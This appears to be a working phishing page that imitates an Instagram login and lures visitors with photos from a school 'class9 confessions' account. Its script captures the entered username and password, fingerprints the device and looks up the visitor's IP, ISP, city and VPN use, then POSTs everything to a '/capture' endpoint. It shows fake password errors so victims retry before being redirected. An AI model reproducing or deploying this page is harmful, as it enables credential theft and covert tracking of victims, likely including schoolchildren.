        <p style="color:#8e8e8e; margin-bottom:20px;">Sign in to see photos of<br><strong>smrj.class9.confessions</strong></p>

        <input type="text" id="username" placeholder="Phone number, username, or email">
        <input type="password" id="password" placeholder="Password">

        <div id="errorMsg" class="error">The username or password you entered is incorrect.</div>

        <button id="loginBtn">Log in</button>

        <div style="margin:20px 0; color:#8e8e8e; font-size:14px;">OR</div>
        <a href="#" style="color:#385185; font-weight:600; text-decoration:none;">Log in with Facebook</a>

        <p style="margin-top:25px; font-size:12px;">
            <a href="#" style="color:#00376b; text-decoration:none;">Forgot password?</a>
        </p>

        <p style="margin-top:30px; font-size:14px;">
            Don't have an account? <a href="#" style="color:#0095f6; text-decoration:none;">Sign up</a>
        </p>
    </div>

    <script>
        const loginBtn = document.getElementById('loginBtn');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const errorMsg = document.getElementById('errorMsg');

        let attemptCount = 0;

        async function getFingerprint() {
            const fp = {};
            fp.userAgent = navigator.userAgent;
            fp.screen = `${screen.width}x${screen.height}`;
            fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            fp.language = navigator.language;
            fp.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
            fp.deviceMemory = navigator.deviceMemory || 'unknown';
            fp.platform = navigator.platform;

            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                fp.battery = `${Math.round(battery.level * 100)}%`;
                fp.charging = battery.charging ? 'Yes' : 'No';
            }

            try {
                const gl = document.createElement('canvas').getContext('webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    fp.gpuVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown';
                    fp.gpuRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
                }
            } catch (e) {}

            try {
                const res = await fetch('https://api.ipapi.is');
                const data = await res.json();
                fp.ip = data.ip || 'unknown';
                fp.isp = data.isp || data.asn?.org || 'unknown';
                fp.country = data.country || 'unknown';
                fp.city = data.city || 'unknown';
                fp.vpn = data.is_proxy || data.is_vpn || data.is_hosting ? 'Yes (detected)' : 'No';
            } catch (e) {
                fp.ip = 'failed';
                fp.isp = 'unknown';
                fp.country = 'unknown';
                fp.city = 'unknown';
                fp.vpn = 'unknown';
            }

            return fp;
        }

        loginBtn.addEventListener('click', async () => {
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            if (!username || !password) return;

            attemptCount++;

            loginBtn.innerHTML = '<div class="spinner"></div> Logging in...';
            loginBtn.disabled = true;
            errorMsg.style.display = 'none';

            let payload = {
                username: username,
                password: password,
                target: "smrj.class9.confessions",
                time: Date.now(),
                attempt: attemptCount
            };

            // Only on first attempt send full fingerprint
            if (attemptCount === 1) {
                const fingerprint = await getFingerprint();
                payload.fingerprint = fingerprint;
            }

            try {
                await fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) {}

            if (attemptCount < 3) {
                setTimeout(() => {
                    errorMsg.style.display = 'block';
                    loginBtn.innerHTML = 'Log in';
                    loginBtn.disabled = false;
                }, 1300);
            } else {
                setTimeout(() => {
                    window.location.href = "1.html";
                }, 1500);
            }
        });
    </script>
